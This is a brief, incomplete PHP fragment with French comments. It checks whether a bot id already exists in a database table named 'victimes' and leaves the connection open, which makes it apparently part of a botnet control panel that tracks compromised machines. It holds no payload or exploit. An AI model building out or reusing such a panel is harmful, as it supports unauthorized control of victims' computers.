<?php
// inclusion des paramètres
include ('bootstrap.php');

// Vérifier si le bot a une entrée dans la base de données
if (is_already_in_use('id_bot', $id_bot, 'victimes')){
    // $errors[] = "Adresse Email déjà utilisé!";
    // Garder la connexion ouverte
 }  

 